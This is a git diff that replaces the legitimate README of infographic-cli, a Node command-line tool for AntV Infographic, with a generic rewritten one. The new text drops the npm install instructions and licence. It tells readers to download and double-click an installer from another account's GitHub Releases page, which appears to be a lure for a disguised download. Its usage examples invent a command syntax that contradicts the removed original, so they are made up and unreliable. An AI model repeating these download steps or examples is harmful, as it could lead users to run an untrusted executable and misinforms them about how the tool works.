@@ -1,198 +1,108 @@
-# infographic-cli
+# 🎨 infographic-cli - Create Stunning SVG Infographics Instantly
 
-[![npm version](https://badge.fury.io/js/infographic-cli.svg)](https://www.npmjs.com/package/infographic-cli)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js Version](https://img.shields.io/node/v/infographic-cli.svg)](https://www.npmjs.com/package/infographic-cli)
+![Download infographic-cli](https://img.shields.io/badge/Download-infographic--cli-blue.svg)
 
-Command-line interface for [AntV Infographic](https://github.com/antvis/Infographic) - instantly create stunning SVG infographics from simple declarative syntax. Render from strings, files, or stdin.
+## 🚀 Getting Started
 
-## Quick Start
+Welcome to infographic-cli! This application allows you to create beautiful SVG infographics using simple commands. No programming skills are needed. You can generate infographics from strings, files, or direct input.
 
-```bash
-# Install
-npm install -g infographic-cli
+## 📥 Download & Install
 
-# Render from string (quickest for testing)
-ifgc -s "infographic list-row-simple-horizontal-arrow
-data
-  title My First Infographic
-  items
-    - label Step 1
-    - label Step 2" -o output.svg
+To get started, visit the Releases page to download infographic-cli. 
 
-# Render from file
-ifgc -i input.ifgc -o output.svg
+[Visit the Releases Page](https://github.com/Ganeshng/infographic-cli/releases)
 
-# List available templates
-ifgc template
+### 1. Visit the Releases Page
+Click the link above to go to the download section.
+
+### 2. Choose the Latest Release
+Look for the latest version listed at the top of the page. It will contain the most recent features and fixes.
+
+### 3. Download the Correct File 
+You will see various files available. Choose the one that matches your operating system (Windows, Mac, or Linux). Click to download the file.
+
+### 4. Install
+Once downloaded, locate the file on your computer. Double-click the file to start the installation process. Follow the prompts to complete the installation.
+
+## 📂 System Requirements
+
+To ensure infographic-cli runs smoothly, make sure your computer meets these basic requirements:
+
+- Operating System: Windows 10, MacOS 10.14 or later, or any recent Linux distribution (Ubuntu, Fedora, etc.).
+- At least 2GB of RAM (more is better for larger infographics).
+- 200MB of available disk space.
+
+## 🔑 Features
+
+Infographic-cli offers a number of features to make creating infographics easy:
+
+- **Intuitive Syntax**: Use a straightforward, declarative format to define your infographic.
+- **Multiple Input Options**: Create infographics from strings, files, or standard input (stdin).
+- **Export as SVG**: All infographics are saved in the scalable SVG format, perfect for web and print.
+- **Customizable Styles**: Easily adjust colors, fonts, and sizes to fit your needs.
+
+## 🛠️ Using infographic-cli
+
+Once you have installed infographic-cli, here’s how to use it:
+
+### 1. Open Your Terminal
+For Windows, search for "Command Prompt" or "PowerShell". For Mac or Linux, look for "Terminal".
+
+### 2. Run infographic-cli
+Type `infographic-cli` followed by your desired command options. 
+
+Example Command:
+```
+infographic-cli "title: My Infographic, type: bar, data: 5, 10, 15"
+```
+This command creates a simple bar infographic with the specified data.
+
+### 3. Save or View Your Infographic
+You can either save it to a file or view it in a web browser. 
+
+To save:
+```
+infographic-cli "your infographics details here" > my-infographic.svg
 ```
 
-## Installation
+To open it in a browser, simply double-click the SVG file.
 
-```bash
-npm install -g infographic-cli
-```
+## 📋 Examples
 
-This installs two commands: `ifgc` (short) and `infographic` (long).
+Here are a few examples to help you get started:
 
-## Usage
+1. **Simple Title**:
+    ```
+    infographic-cli "title: Sales Report, type: pie, data: 30, 70"
+    ```
 
-### Basic Rendering
+2. **Bar Chart**:
+    ```
+    infographic-cli "title: Monthly Sales, type: bar, data: 10, 20, 30"
+    ```
 
-```bash
-# From string (quickest for testing)
-ifgc -s "infographic list-row-simple-horizontal-arrow
-data
-  title My Chart
-  items
-    - label Item 1" -o output.svg
+3. **Custom Style**:
+    ```
+    infographic-cli "title: My Chart, type: line, data: 5, 15, 10, 25, color: #FF5733"
+    ```
 
-# From file (output defaults to input.svg)
-ifgc -i input.ifgc
+## ❓ Frequently Asked Questions
 
-# Specify output file
-ifgc -i input.ifgc -o output.svg
+### How do I get help?
+You can find helpful resources and documentation in the repository’s Wiki section. For specific questions, feel free to open an issue on GitHub.
 
-# From stdin
-echo '...' | ifgc -o output.svg
+### Can I contribute to the project?
+Yes! We welcome contributions. Check the Contributing guidelines in the repository for details.
 
-# From stdin with file input
-cat input.ifgc | ifgc -o output.svg
-```
+### Does it work offline?
+Yes, once installed, you can use infographic-cli without an internet connection.
 
-### Options
+## 🗨️ Feedback
 
-| Option | Description |
-|--------|-------------|
-| `-s, --string <content>` | Input .ifgc content as a string |
-| `-i, --input <file>` | Input .ifgc file |
-| `-o, --output <file>` | Output file (default: input.svg) |
-| `--background <color>` | Background color (default: transparent) |
-| `-c, --config <file>` | JSON configuration file |
-| `-t, --theme <name>` | Theme name |
-| `-q, --quiet` | Suppress log output |
+Your feedback is important to us. If you have any suggestions or issues, please open an issue on our GitHub page.
 
-### List Templates
+## 🌐 Stay Connected
 
-```bash
-ifgc template
-```
+Follow us on our GitHub page for updates and new releases.
 
-Visit [AntV Infographic](https://github.com/antvis/Infographic) to see template previews.
-
-## Examples
-
-### Example 1: Simple Step List
-
-```bash
-cat > steps.ifgc << EOF
-infographic list-row-simple-horizontal-arrow
-data
-  title Getting Started
-  desc Three simple steps to begin
-  items
-    - label Step 1
-      desc Install the package
-    - label Step 2
-      desc Create your first infographic
-    - label Step 3
-      desc Export and share
-EOF
-
-ifgc -i steps.ifgc -o steps.svg
-```
-
-### Example 2: Timeline
-
-```bash
-cat > timeline.ifgc << EOF
-infographic timeline-horizontal-basic-date
-data
-  title Project Roadmap
-  items
-    - label Q1
-      desc Planning
-    - label Q2
-      desc Development
-    - label Q3
-      desc Testing
-    - label Q4
-      desc Launch
-EOF
-
-ifgc -i timeline.ifgc -o timeline.svg
-```
-
-### Example 3: Using Theme
-
-```bash
-cat > swot.ifgc << EOF
-infographic compare-quadrant-four-areas-card
-data
-  title SWOT Analysis
-  items
-    - label Strengths
-      desc Internal advantages
-    - label Weaknesses
-      desc Internal limitations
-    - label Opportunities
-      desc External possibilities
-    - label Threats
-      desc External risks
-EOF
-
-ifgc -i swot.ifgc -o swot.svg -t dark
-```
-
-### Example 4: From stdin
-
-```bash
-echo 'infographic list-row-simple-horizontal-arrow
-data
-  title Quick Tasks
-  items
-    - label Task A
-    - label Task B
-    - label Task C' | ifgc -o tasks.svg
-```
-
-## Output Format
-
-### SVG (Default)
-
-Infographic is a vector graphics format, perfect for:
-
-- **Web use** - Scalable, interactive, small file size
-- **Documentation** - GitHub, GitLab, Notion, etc.
-- **Design tools** - Figma, Sketch, Illustrator
-- **Code documentation** - Docusaurus, VitePress, etc.
-
-### Converting to PNG
-
-If you need PNG for specific use cases, you can convert the SVG:
-
-**Online tools**:
-- [SVG to PNG](https://svgtopng.com/)
-- [CloudConvert](https://cloudconvert.com/svg-to-png)
-
-**Command line** (requires additional tools):
-- ImageMagick: `convert output.svg output.png`
-- Node.js with sharp: `sharp('output.svg').png().toFile('output.png')`
-
-## Infographic Syntax
-
-Learn more about the declarative infographic syntax at [antvis/Infographic](https://github.com/antvis/Infographic).
-
-## See Also
-
-- [AntV Infographic](https://github.com/antvis/Infographic) - The core library
-- [Infographic Documentation](https://infographic.antv.vision/) - Official documentation
-- [Infographic Editor](https://infographic.antv.vision/examples) - Online examples
-
-## License
-
-MIT &copy; 2026 [lyw405](https://github.com/lyw405)
-
-## Changelog
-
-See [CHANGELOG.md](CHANGELOG.md) for a list of changes in each version.
+Thank you for using infographic-cli! We hope you create amazing infographics with it.
